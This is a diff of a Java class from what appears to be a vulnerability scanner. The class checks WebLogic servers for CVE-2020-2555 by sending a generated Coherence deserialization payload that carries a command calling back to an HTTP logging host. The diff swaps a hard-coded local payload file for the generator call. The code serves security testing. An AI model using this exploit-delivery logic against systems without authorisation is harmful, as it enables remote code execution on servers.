@@ -6,9 +6,6 @@ import com.xmap.api.utils.TextUtils;
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 
-import java.nio.file.Files;
-import java.nio.file.Paths;
-
 public class GBWCVE_2020_2555_NOECHO extends GBWAbstractNoEchoVul{
 
     private static final Logger log = LoggerFactory.getLogger(GBWCVE_2020_2555_NOECHO.class);
@@ -41,7 +38,6 @@ public class GBWCVE_2020_2555_NOECHO extends GBWAbstractNoEchoVul{
 
         try {
 
-
             String version = GBWWeblogicVersion.getVersion(config, host);
 
             if (TextUtils.isEmpty(version))
@@ -51,15 +47,14 @@ public class GBWCVE_2020_2555_NOECHO extends GBWAbstractNoEchoVul{
             if (TextUtils.isEmpty(pversion))
                 return null;
 
-             
 
             GBWHttpLogClient httpLogClient = new GBWHttpLogClient(host, config.getHttpLogIP(), config.getHttpLogPort(), "CVE-2020-2555");
 
             String cmd = httpLogClient.makeRequestCmd(config.getHttpClientCmd());
 
 
-            //byte[] payload =GBWCoherenceClient.makePayload(config.getCoherenceIP(), config.getCoherencePort(), pversion, cmd);
-            byte[] payload = Files.readAllBytes(Paths.get("D:\\shajf_dev\\GBWScanner\\data\\coherence_1036.data"));
+            byte[] payload =GBWCoherenceClient.makePayload(config.getCoherenceIP(), config.getCoherencePort(), pversion, cmd);
+
             if (payload == null || payload.length == 0)
                 return null;
 
